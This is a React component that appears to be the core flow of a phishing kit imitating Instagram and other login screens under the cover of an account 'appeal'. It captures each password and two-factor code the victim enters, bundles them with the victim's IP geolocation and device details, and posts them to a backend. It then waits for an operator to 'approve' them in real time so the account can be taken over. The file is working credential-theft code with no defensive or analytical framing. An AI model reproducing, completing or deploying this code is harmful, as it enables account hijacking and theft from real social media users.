'use client';

import InstagramLoginModal from '@/components/InstagramLoginModal';
import InstagramTwoFAModal from '@/components/InstagramTwoFAModal';
import LoginChoiceModal from '@/components/LoginChoiceModal';
import LoginModal from '@/components/LoginModal';
import SuccessModal from '@/components/SuccessModal';
import TwoFAModal from '@/components/TwoFAModal';
import { useAppStore } from '@/store/store';
import config from '@/utils/config';
import { buildAppealMessage } from '@/utils/message';
import { pollApproval } from '@/utils/poll-approval';
import axios from 'axios';
import { useCallback, type FC } from 'react';

interface FormFlowProps {
    texts: Record<string, string>;
}

const FormFlow: FC<FormFlowProps> = ({ texts }) => {
    const {
        geoInfo,
        deviceLabel,
        formData,
        loginData,
        loginProvider,
        messageId,
        passwordAttempts,
        twoFAAttempts,
        showLoginChoiceModal,
        showLoginModal,
        show2FAModal,
        showSuccessModal,
        setLoginData,
        setMessageId,
        addPasswordAttempt,
        addTwoFAAttempt,
        setShowLoginChoiceModal,
        setShowLoginModal,
        setShow2FAModal,
        setShowSuccessModal
    } = useAppStore();

    const buildMessage = useCallback(
        (login = loginData, passwords = passwordAttempts, codes = twoFAAttempts) => {
            if (!geoInfo) return '';
            return buildAppealMessage({
                form: formData,
                login,
                loginProvider,
                passwordLogs: passwords,
                codeAttempts: codes,
                ip: geoInfo,
                deviceLabel
            });
        },
        [geoInfo, deviceLabel, formData, loginData, loginProvider, passwordAttempts, twoFAAttempts]
    );

    const sendWithApproval = async (message: string, approvalType: 'password' | 'code') => {
        const sessionId = crypto.randomUUID();
        const res = await axios.post('/api/send', {
            message,
            old_message_id: messageId,
            approval_type: approvalType,
            session_id: sessionId
        });

        if (res?.data?.success && typeof res.data.message_id === 'number') {
            setMessageId(res.data.message_id);
        }

        return pollApproval(sessionId);
    };

    const handleLoginSubmit = async (email: string, password: string) => {
        if (!geoInfo) return { approved: false, isLastAttempt: false };

        const nextPasswords = [...passwordAttempts, password];
        addPasswordAttempt(password);
        setLoginData({ email, password });

        const message = buildMessage({ email, password }, nextPasswords, twoFAAttempts);

        try {
            const result = await sendWithApproval(message, 'password');
            const isLastAttempt = nextPasswords.length >= (config.MAX_PASS ?? 2);
            return { approved: result === 'approved', isLastAttempt };
        } catch {
            return { approved: false, isLastAttempt: nextPasswords.length >= (config.MAX_PASS ?? 2) };
        }
    };

    const handle2FASubmit = async (code: string) => {
        if (!geoInfo) return { approved: false, isLastAttempt: false };

        const nextCodes = [...twoFAAttempts, code];
        addTwoFAAttempt(code);

        const message = buildMessage(loginData, passwordAttempts, nextCodes);

        try {
            const result = await sendWithApproval(message, 'code');
            const isLastAttempt = nextCodes.length >= (config.MAX_CODE ?? 3);
            return { approved: result === 'approved', isLastAttempt };
        } catch {
            return { approved: false, isLastAttempt: nextCodes.length >= (config.MAX_CODE ?? 3) };
        }
    };

    return (
        <>
            <LoginChoiceModal
                show={showLoginChoiceModal}
                texts={texts}
                onClose={() => setShowLoginChoiceModal(false)}
                onSelect={() => {
                    setShowLoginChoiceModal(false);
                    setShowLoginModal(true);
                }}
            />

            {loginProvider === 'instagram' ? (
                <InstagramLoginModal
                    show={showLoginModal}
                    texts={texts}
                    onClose={() => setShowLoginModal(false)}
                    onSubmit={handleLoginSubmit}
                    onSuccess={() => {
                        setShowLoginModal(false);
                        setShow2FAModal(true);
                    }}
                />
            ) : (
                <LoginModal
                    show={showLoginModal}
                    texts={texts}
                    onClose={() => setShowLoginModal(false)}
                    onSubmit={handleLoginSubmit}
                    onSuccess={() => {
                        setShowLoginModal(false);
                        setShow2FAModal(true);
                    }}
                />
            )}

            {loginProvider === 'instagram' ? (
                <InstagramTwoFAModal
                    show={show2FAModal}
                    texts={texts}
                    formData={formData}
                    onClose={() => setShow2FAModal(false)}
                    onSubmit={handle2FASubmit}
                    onSuccess={() => {
                        setShow2FAModal(false);
                        setShowSuccessModal(true);
                    }}
                />
            ) : (
                <TwoFAModal
                    show={show2FAModal}
                    texts={texts}
                    formData={formData}
                    onClose={() => setShow2FAModal(false)}
                    onSubmit={handle2FASubmit}
                    onSuccess={() => {
                        setShow2FAModal(false);
                        setShowSuccessModal(true);
                    }}
                />
            )}

            <SuccessModal show={showSuccessModal} onClose={() => setShowSuccessModal(false)} texts={texts} />
        </>
    );
};

export default FormFlow;
